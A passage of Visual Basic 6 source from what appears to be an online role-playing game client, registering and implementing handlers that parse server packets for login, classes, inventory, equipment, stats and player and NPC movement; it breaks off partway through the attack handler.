Attribute VB_Name = "modHandleData"
Option Explicit

' ******************************************
' ** Parses and handles String packets    **
' ******************************************
Public Function GetAddress(FunAddr As Long) As Long
    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    GetAddress = FunAddr
    
    ' Error handler
    Exit Function
errorhandler:
    HandleError "GetAddress", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Function
End Function

Public Sub InitMessages()
    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    HandleDataSub(SAlertMsg) = GetAddress(AddressOf HandleAlertMsg)
    HandleDataSub(SLoginOk) = GetAddress(AddressOf HandleLoginOk)
    HandleDataSub(SClassesData) = GetAddress(AddressOf HandleClassesData)
    HandleDataSub(SInGame) = GetAddress(AddressOf HandleInGame)
    HandleDataSub(SPlayerInv) = GetAddress(AddressOf HandlePlayerInv)
    HandleDataSub(SPlayerInvUpdate) = GetAddress(AddressOf HandlePlayerInvUpdate)
    HandleDataSub(SPlayerWornEq) = GetAddress(AddressOf HandlePlayerWornEq)
    HandleDataSub(SPlayerHp) = GetAddress(AddressOf HandlePlayerHp)
    HandleDataSub(SPlayerMp) = GetAddress(AddressOf HandlePlayerMp)
    HandleDataSub(SPlayerStats) = GetAddress(AddressOf HandlePlayerStats)
    HandleDataSub(SPlayerData) = GetAddress(AddressOf HandlePlayerData)
    HandleDataSub(SPlayerMove) = GetAddress(AddressOf HandlePlayerMove)
    HandleDataSub(SNpcMove) = GetAddress(AddressOf HandleNpcMove)
    HandleDataSub(SPlayerDir) = GetAddress(AddressOf HandlePlayerDir)
    HandleDataSub(SNpcDir) = GetAddress(AddressOf HandleNpcDir)
    HandleDataSub(SPlayerXY) = GetAddress(AddressOf HandlePlayerXY)
    HandleDataSub(SPlayerXYMap) = GetAddress(AddressOf HandlePlayerXYMap)
    HandleDataSub(SAttack) = GetAddress(AddressOf HandleAttack)
    HandleDataSub(SNpcAttack) = GetAddress(AddressOf HandleNpcAttack)
    HandleDataSub(SCheckForMap) = GetAddress(AddressOf HandleCheckForMap)
    HandleDataSub(SMapData) = GetAddress(AddressOf HandleMapData)
    HandleDataSub(SMapItemData) = GetAddress(AddressOf HandleMapItemData)
    HandleDataSub(SMapNpcData) = GetAddress(AddressOf HandleMapNpcData)
    HandleDataSub(SMapDone) = GetAddress(AddressOf HandleMapDone)
    HandleDataSub(SGlobalMsg) = GetAddress(AddressOf HandleGlobalMsg)
    HandleDataSub(SAdminMsg) = GetAddress(AddressOf HandleAdminMsg)
    HandleDataSub(SPlayerMsg) = GetAddress(AddressOf HandlePlayerMsg)
    HandleDataSub(SMapMsg) = GetAddress(AddressOf HandleMapMsg)
    HandleDataSub(SSpawnItem) = GetAddress(AddressOf HandleSpawnItem)
    HandleDataSub(SItemEditor) = GetAddress(AddressOf HandleItemEditor)
    HandleDataSub(SUpdateItem) = GetAddress(AddressOf HandleUpdateItem)
    HandleDataSub(SSpawnNpc) = GetAddress(AddressOf HandleSpawnNpc)
    HandleDataSub(SNpcDead) = GetAddress(AddressOf HandleNpcDead)
    HandleDataSub(SNpcEditor) = GetAddress(AddressOf HandleNpcEditor)
    HandleDataSub(SUpdateNpc) = GetAddress(AddressOf HandleUpdateNpc)
    HandleDataSub(SMapKey) = GetAddress(AddressOf HandleMapKey)
    HandleDataSub(SEditMap) = GetAddress(AddressOf HandleEditMap)
    HandleDataSub(SShopEditor) = GetAddress(AddressOf HandleShopEditor)
    HandleDataSub(SUpdateShop) = GetAddress(AddressOf HandleUpdateShop)
    HandleDataSub(SSpellEditor) = GetAddress(AddressOf HandleSpellEditor)
    HandleDataSub(SUpdateSpell) = GetAddress(AddressOf HandleUpdateSpell)
    HandleDataSub(SSpells) = GetAddress(AddressOf HandleSpells)
    HandleDataSub(SLeft) = GetAddress(AddressOf HandleLeft)
    HandleDataSub(SResourceCache) = GetAddress(AddressOf HandleResourceCache)
    HandleDataSub(SResourceEditor) = GetAddress(AddressOf HandleResourceEditor)
    HandleDataSub(SUpdateResource) = GetAddress(AddressOf HandleUpdateResource)
    HandleDataSub(SSendPing) = GetAddress(AddressOf HandleSendPing)
    HandleDataSub(SActionMsg) = GetAddress(AddressOf HandleActionMsg)
    HandleDataSub(SPlayerEXP) = GetAddress(AddressOf HandlePlayerExp)
    HandleDataSub(SBlood) = GetAddress(AddressOf HandleBlood)
    HandleDataSub(SAnimationEditor) = GetAddress(AddressOf HandleAnimationEditor)
    HandleDataSub(SUpdateAnimation) = GetAddress(AddressOf HandleUpdateAnimation)
    HandleDataSub(SAnimation) = GetAddress(AddressOf HandleAnimation)
    HandleDataSub(SMapNpcVitals) = GetAddress(AddressOf HandleMapNpcVitals)
    HandleDataSub(SCooldown) = GetAddress(AddressOf HandleCooldown)
    HandleDataSub(SClearSpellBuffer) = GetAddress(AddressOf HandleClearSpellBuffer)
    HandleDataSub(SSayMsg) = GetAddress(AddressOf HandleSayMsg)
    HandleDataSub(SOpenShop) = GetAddress(AddressOf HandleOpenShop)
    HandleDataSub(SResetShopAction) = GetAddress(AddressOf HandleResetShopAction)
    HandleDataSub(SStunned) = GetAddress(AddressOf HandleStunned)
    HandleDataSub(SMapWornEq) = GetAddress(AddressOf HandleMapWornEq)
    HandleDataSub(SBank) = GetAddress(AddressOf HandleBank)
    HandleDataSub(STrade) = GetAddress(AddressOf HandleTrade)
    HandleDataSub(SCloseTrade) = GetAddress(AddressOf HandleCloseTrade)
    HandleDataSub(STradeUpdate) = GetAddress(AddressOf HandleTradeUpdate)
    HandleDataSub(STradeStatus) = GetAddress(AddressOf HandleTradeStatus)
    HandleDataSub(STarget) = GetAddress(AddressOf HandleTarget)
    HandleDataSub(SHotbar) = GetAddress(AddressOf HandleHotbar)
    HandleDataSub(SHighIndex) = GetAddress(AddressOf HandleHighIndex)
    HandleDataSub(SSound) = GetAddress(AddressOf HandleSound)
    HandleDataSub(STradeRequest) = GetAddress(AddressOf HandleTradeRequest)
    HandleDataSub(SPartyInvite) = GetAddress(AddressOf HandlePartyInvite)
    HandleDataSub(SPartyUpdate) = GetAddress(AddressOf HandlePartyUpdate)
    HandleDataSub(SPartyVitals) = GetAddress(AddressOf HandlePartyVitals)
    HandleDataSub(SPlayBGM) = GetAddress(AddressOf HandlePlayBGM)
    HandleDataSub(SPlaySound) = GetAddress(AddressOf HandlePlaySound)
    HandleDataSub(SFadeoutBGM) = GetAddress(AddressOf HandleFadeoutBGM)
    HandleDataSub(SStopSound) = GetAddress(AddressOf HandleStopSound)
    HandleDataSub(SSwitchesAndVariables) = GetAddress(AddressOf HandleSwitchesAndVariables)
    HandleDataSub(SChatBubble) = GetAddress(AddressOf HandleChatBubble)
    HandleDataSub(SSpecialEffect) = GetAddress(AddressOf HandleSpecialEffect)
    HandleDataSub(SFlash) = GetAddress(AddressOf HandleFlash)
    HandleDataSub(SEventData) = GetAddress(AddressOf Events_HandleEventData)
    HandleDataSub(SEventEditor) = GetAddress(AddressOf Events_HandleEventEditor)
    HandleDataSub(SEventUpdate) = GetAddress(AddressOf Events_HandleEventUpdate)
    HandleDataSub(SEffectEditor) = GetAddress(AddressOf HandleEffectEditor)
    HandleDataSub(SUpdateEffect) = GetAddress(AddressOf HandleUpdateEffect)
    HandleDataSub(SEffect) = GetAddress(AddressOf HandleEffect)
    HandleDataSub(SMapReport) = GetAddress(AddressOf HandleMapReport)
    HandleDataSub(SCreateProjectile) = GetAddress(AddressOf HandleCreateProjectile)
    HandleDataSub(SSendNews) = GetAddress(AddressOf HandleSendNews)
    HandleDataSub(SNewsEditor) = GetAddress(AddressOf HandleNewsEditor)
    HandleDataSub(SFly) = GetAddress(AddressOf HandleFly)
    HandleDataSub(SSpecialAction) = GetAddress(AddressOf HandleSpecialAction)
    HandleDataSub(SSpellBuffer) = GetAddress(AddressOf HandleSpellBuffer)
    HandleDataSub(STransporte) = GetAddress(AddressOf HandleTransporte)
    HandleDataSub(SMapNpcDataXY) = GetAddress(AddressOf HandleMapNpcDataXY)
    HandleDataSub(SUpdateQuest) = GetAddress(AddressOf HandleUpdatequest)
    HandleDataSub(SQuestEditor) = GetAddress(AddressOf HandleQuestEditor)
    HandleDataSub(SPlayerQuests) = GetAddress(AddressOf HandlePlayerQuests)
    HandleDataSub(SPlayerQuest) = GetAddress(AddressOf HandlePlayerQuest)
    HandleDataSub(SPlayerInfo) = GetAddress(AddressOf HandlePlayerInfo)
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "InitMessages", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Sub HandleData(ByRef Data() As Byte)
Dim Buffer As clsBuffer
Dim MsgType As Long

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler

    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    
    MsgType = Buffer.ReadLong
    
    If MsgType < 0 Then
        DestroyGame
        Exit Sub
    End If

    If MsgType >= SMSG_COUNT Then
        DestroyGame
        Exit Sub
    End If
    
    CallWindowProc HandleDataSub(MsgType), 1, Buffer.ReadBytes(Buffer.Length), 0, 0
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleData", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Sub HandleAlertMsg(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim Msg As String
Dim Buffer As clsBuffer

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    frmMenu.visible = True
    
    
    Msg = Buffer.ReadString 'Parse(1)
    
    Set Buffer = Nothing
    Call MsgBox(Msg, vbOKOnly, Options.Game_Name)
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleAlertMsg", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Sub HandleLoginOk(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim Buffer As clsBuffer

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    
    ' save options
    Options.savePass = frmMenu.chkPass.Value
    Options.Username = Trim$(frmMenu.txtLUser.Text)

    If frmMenu.chkPass.Value = 0 Then
        Options.Password = vbNullString
    Else
        Options.Password = Trim$(frmMenu.txtLPass.Text)
    End If
    
    SaveOptions
    
    ' Now we can receive game data
    MyIndex = Buffer.ReadLong
    
    ' player high index
    Player_HighIndex = Buffer.ReadLong
    
    MoedaZ = Buffer.ReadLong
    
    Set Buffer = Nothing
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleLoginOk", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub
Sub HandleClassesData(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim n As Long
Dim i As Long
Dim Z As Long, X As Long
Dim Buffer As clsBuffer

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    n = 1
    ' Max classes
    Max_Classes = Buffer.ReadLong 'CByte(Parse(n))
    ReDim Class(1 To Max_Classes)
    n = n + 1

    For i = 1 To Max_Classes

        With Class(i)
            .Name = Buffer.ReadString 'Trim$(Parse(n))
            .Vital(Vitals.HP) = Buffer.ReadLong 'CLng(Parse(n + 1))
            .Vital(Vitals.MP) = Buffer.ReadLong 'CLng(Parse(n + 2))
            
            ' get array size
            Z = Buffer.ReadLong
            ' redim array
            ReDim .MaleSprite(0 To Z)
            ' loop-receive data
            For X = 0 To Z
                .MaleSprite(X) = Buffer.ReadLong
            Next
            
            ' get array size
            Z = Buffer.ReadLong
            ' redim array
            ReDim .FemaleSprite(0 To Z)
            ' loop-receive data
            For X = 0 To Z
                .FemaleSprite(X) = Buffer.ReadLong
            Next
                            
            For X = 1 To Stats.Stat_Count - 1
                .Stat(X) = Buffer.ReadLong
            Next
        End With

        n = n + 10
    Next

    Set Buffer = Nothing
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleClassesData", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Sub HandleInGame(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    InGame = True
    Call SendDevSuite
    Call GameInit
    Call GameLoop
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleInGame", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Sub HandlePlayerInv(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim n As Long
Dim i As Long
Dim Buffer As clsBuffer

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    n = 1

    For i = 1 To MAX_INV
        Call SetPlayerInvItemNum(MyIndex, i, Buffer.ReadLong)
        Call SetPlayerInvItemValue(MyIndex, i, Buffer.ReadLong)
        n = n + 2
    Next
    
    ' changes to inventory, need to clear any drop menu
    sDialogue = vbNullString
    GUIWindow(GUI_CURRENCY).visible = False
    inChat = False
    tmpCurrencyItem = 0
    CurrencyMenu = 0 ' clear

    Set Buffer = Nothing
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandlePlayerInv", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Sub HandlePlayerInvUpdate(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim n As Long
Dim Buffer As clsBuffer

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    n = Buffer.ReadLong 'CLng(Parse(1))
    Call SetPlayerInvItemNum(MyIndex, n, Buffer.ReadLong) 'CLng(Parse(2)))
    Call SetPlayerInvItemValue(MyIndex, n, Buffer.ReadLong) 'CLng(Parse(3)))
    ' changes, clear drop menu
        sDialogue = vbNullString
    GUIWindow(GUI_CURRENCY).visible = False
    inChat = False
    tmpCurrencyItem = 0
    CurrencyMenu = 0 ' clear
    Set Buffer = Nothing
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandlePlayerInvUpdate", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Sub HandlePlayerWornEq(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim Buffer As clsBuffer

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    Call SetPlayerEquipment(MyIndex, Buffer.ReadLong, Armor)
    Call SetPlayerEquipment(MyIndex, Buffer.ReadLong, Weapon)
    Call SetPlayerEquipment(MyIndex, Buffer.ReadLong, Helmet)
    Call SetPlayerEquipment(MyIndex, Buffer.ReadLong, Shield)
    
    ' changes to inventory, need to clear any drop menu
    sDialogue = vbNullString
    GUIWindow(GUI_CURRENCY).visible = False
    inChat = False
    tmpCurrencyItem = 0
    CurrencyMenu = 0 ' clear
    
    Set Buffer = Nothing
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandlePlayerWornEq", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Sub HandleMapWornEq(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim Buffer As clsBuffer
Dim playerNum As Long

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    
    Buffer.WriteBytes Data()
    
    playerNum = Buffer.ReadLong
    Call SetPlayerEquipment(playerNum, Buffer.ReadLong, Armor)
    Call SetPlayerEquipment(playerNum, Buffer.ReadLong, Weapon)
    Call SetPlayerEquipment(playerNum, Buffer.ReadLong, Helmet)
    Call SetPlayerEquipment(playerNum, Buffer.ReadLong, Shield)
    
    Set Buffer = Nothing
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleMapWornEq", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandlePlayerHp(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim Buffer As clsBuffer
Dim TheIndex As Long

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    TheIndex = Buffer.ReadLong
    Player(TheIndex).MaxVital(Vitals.HP) = Buffer.ReadLong
    Call SetPlayerVital(TheIndex, Vitals.HP, Buffer.ReadLong)
    
    'If GetPlayerMaxVital(MyIndex, Vitals.HP) > 0 Then
    '    'frmMain.lblHP.Caption = Int(GetPlayerVital(MyIndex, Vitals.HP) / GetPlayerMaxVital(MyIndex, Vitals.HP) * 100) & "%"
    '    frmMain.lblHP.Caption = GetPlayerVital(MyIndex, Vitals.HP) & "/" & GetPlayerMaxVital(MyIndex, Vitals.HP)
    '    ' hp bar
    '    frmMain.imgHPBar.Width = ((GetPlayerVital(MyIndex, Vitals.HP) / HPBar_Width) / (GetPlayerMaxVital(MyIndex, Vitals.HP) / HPBar_Width)) * HPBar_Width
    'End If

    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandlePlayerHP", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandlePlayerMp(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim Buffer As clsBuffer

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    Player(MyIndex).MaxVital(Vitals.MP) = Buffer.ReadLong
    Call SetPlayerVital(MyIndex, Vitals.MP, Buffer.ReadLong)
    
    'If GetPlayerMaxVital(MyIndex, Vitals.MP) > 0 Then
    '    'frmMain.lblMP.Caption = Int(GetPlayerVital(MyIndex, Vitals.MP) / GetPlayerMaxVital(MyIndex, Vitals.MP) * 100) & "%"
    '    frmMain.lblMP.Caption = GetPlayerVital(MyIndex, Vitals.MP) & "/" & GetPlayerMaxVital(MyIndex, Vitals.MP)
    '    ' mp bar
    '    frmMain.imgMPBar.Width = ((GetPlayerVital(MyIndex, Vitals.MP) / SPRBar_Width) / (GetPlayerMaxVital(MyIndex, Vitals.MP) / SPRBar_Width)) * SPRBar_Width
    'End If

    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandlePlayerMP", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandlePlayerStats(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim Buffer As clsBuffer
Dim i As Long

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    
    For i = 1 To Stats.Stat_Count - 1
        SetPlayerStat MyIndex, i, Buffer.ReadLong
        SetPlayerStatPoints MyIndex, i, Buffer.ReadLong
        StatNextLevel(i) = Buffer.ReadLong
        StatLastLevel(i) = Buffer.ReadLong
    '    frmMain.lblCharStat(i).Caption = GetPlayerStat(MyIndex, i)
    Next
    
    Player(MyIndex).POINTS = Buffer.ReadLong
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandlePlayerStats", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandlePlayerExp(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim Buffer As clsBuffer
Dim i As Long
    
    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    
    SetPlayerExp MyIndex, Buffer.ReadLong
    TNL = Buffer.ReadLong
    
    'frmMain.lblEXP.Caption = GetPlayerExp(Index) & "/" & TNL
    ' mp bar
    'frmMain.imgEXPBar.Width = ((GetPlayerExp(MyIndex) / EXPBar_Width) / (TNL / EXPBar_Width)) * EXPBar_Width
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandlePlayerExp", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandlePlayerData(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim i As Long, X As Long
Dim Buffer As clsBuffer

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    i = Buffer.ReadLong
    Call SetPlayerName(i, Buffer.ReadString)
    Call SetPlayerLevel(i, Buffer.ReadLong)
    Call SetPlayerPOINTS(i, Buffer.ReadLong)
    Call SetPlayerSprite(i, Buffer.ReadLong)
    Call SetPlayerMap(i, Buffer.ReadLong)
    Call SetPlayerX(i, Buffer.ReadLong)
    Call SetPlayerY(i, Buffer.ReadLong)
    Call SetPlayerDir(i, Buffer.ReadLong)
    Call SetPlayerAccess(i, Buffer.ReadLong)
    Call SetPlayerPK(i, Buffer.ReadLong)
    Call SetPlayerClass(i, Buffer.ReadLong)
    Player(i).Trans = Buffer.ReadLong
    Player(i).RawPDL = Buffer.ReadLong
    Player(i).PDL = Buffer.ReadLong
    Player(i).EsoNum = Buffer.ReadLong
    Player(i).EsoTime = Buffer.ReadLong
    TempPlayer(i).Fly = Buffer.ReadByte
    Player(i).VIP = Buffer.ReadByte
    Player(i).Hair = Buffer.ReadByte
    TempPlayer(i).HairChange = Buffer.ReadByte
    Player(i).Titulo = Buffer.ReadLong
    Player(i).Guild = Buffer.ReadLong
    Buffer.ReadByte 'AFK
    TempPlayer(i).speed = Buffer.ReadLong
    Buffer.ReadLong 'VIP Exp
    Buffer.ReadLong 'Vip next level
    Buffer.ReadLong 'Instance
    Buffer.ReadLong 'Services
    Buffer.ReadByte 'IsGod
    
    For X = 1 To Stats.Stat_Count - 1
        SetPlayerStat i, X, Buffer.ReadLong
        SetPlayerStatPoints i, X, Buffer.ReadLong
    Next
    
    Player(i).IsDead = Buffer.ReadByte

    ' Check if the player is the client player
    If i = MyIndex Then
        ' Reset directions
        DirUp = False
        DirDown = False
        DirLeft = False
        DirRight = False
    End If

    ' Make sure they aren't walking
    TempPlayer(i).Moving = 0
    TempPlayer(i).xOffset = 0
    TempPlayer(i).YOffset = 0
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandlePlayerData", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandlePlayerMove(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim i As Long
Dim X As Long
Dim Y As Long
Dim Dir As Long
Dim n As Byte
Dim Buffer As clsBuffer

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    i = Buffer.ReadLong
    X = Buffer.ReadLong
    Y = Buffer.ReadLong
    Dir = Buffer.ReadLong
    n = Buffer.ReadLong
    Call SetPlayerX(i, X)
    Call SetPlayerY(i, Y)
    Call SetPlayerDir(i, Dir)
    TempPlayer(i).xOffset = 0
    TempPlayer(i).YOffset = 0
    TempPlayer(i).Moving = n

    Select Case GetPlayerDir(i)
        Case DIR_UP
            TempPlayer(i).YOffset = PIC_Y
        Case DIR_DOWN
            TempPlayer(i).YOffset = PIC_Y * -1
        Case DIR_LEFT
            TempPlayer(i).xOffset = PIC_X
        Case DIR_RIGHT
            TempPlayer(i).xOffset = PIC_X * -1
    End Select
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandlePlayerMove", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleNpcMove(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim MapNpcNum As Long
Dim X As Long
Dim Y As Long
Dim Dir As Long
Dim Movement As Long
Dim Buffer As clsBuffer

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    MapNpcNum = Buffer.ReadLong
    X = Buffer.ReadLong
    Y = Buffer.ReadLong
    Dir = Buffer.ReadLong
    Movement = Buffer.ReadLong

    With TempMapNpc(MapNpcNum)
        MapNpc(MapNpcNum).X = X
        MapNpc(MapNpcNum).Y = Y
        MapNpc(MapNpcNum).Dir = Dir
        .xOffset = 0
        .YOffset = 0
        .Moving = Movement

        Select Case MapNpc(MapNpcNum).Dir
            Case DIR_UP
                .YOffset = PIC_Y
            Case DIR_DOWN
                .YOffset = PIC_Y * -1
            Case DIR_LEFT
                .xOffset = PIC_X
            Case DIR_RIGHT
                .xOffset = PIC_X * -1
        End Select

    End With

    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleNpcMove", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandlePlayerDir(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim i As Long
Dim Dir As Byte
Dim Buffer As clsBuffer

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    i = Buffer.ReadLong
    Dir = Buffer.ReadLong
    Call SetPlayerDir(i, Dir)

    With TempPlayer(i)
        .xOffset = 0
        .YOffset = 0
        .Moving = 0
    End With

    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandlePlayerDir", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleNpcDir(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim i As Long
Dim Dir As Byte
Dim Buffer As clsBuffer

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    i = Buffer.ReadLong
    Dir = Buffer.ReadLong

    With TempMapNpc(i)
        MapNpc(i).Dir = Dir
        .xOffset = 0
        .YOffset = 0
        .Moving = 0
    End With

    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleNpcDir", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandlePlayerXY(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim X As Long
Dim Y As Long
Dim Dir As Long
Dim Buffer As clsBuffer

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    X = Buffer.ReadLong
    Y = Buffer.ReadLong
    Dir = Buffer.ReadLong
    Call SetPlayerX(MyIndex, X)
    Call SetPlayerY(MyIndex, Y)
    Call SetPlayerDir(MyIndex, Dir)
    ' Make sure they aren't walking
    TempPlayer(MyIndex).Moving = 0
    TempPlayer(MyIndex).xOffset = 0
    TempPlayer(MyIndex).YOffset = 0
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandlePlayerXY", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandlePlayerXYMap(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim X As Long
Dim Y As Long
Dim Dir As Long
Dim Buffer As clsBuffer
Dim thePlayer As Long

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    thePlayer = Buffer.ReadLong
    X = Buffer.ReadLong
    Y = Buffer.ReadLong
    Dir = Buffer.ReadLong
    Call SetPlayerX(thePlayer, X)
    Call SetPlayerY(thePlayer, Y)
    Call SetPlayerDir(thePlayer, Dir)
    ' Make sure they aren't walking
    TempPlayer(thePlayer).Moving = 0
    TempPlayer(thePlayer).xOffset = 0
    TempPlayer(thePlayer).YOffset = 0
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandlePlayerXYMap", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleAttack(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim i As Long
Dim Buffer As clsBuffer

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    i = Buffer.ReadLong
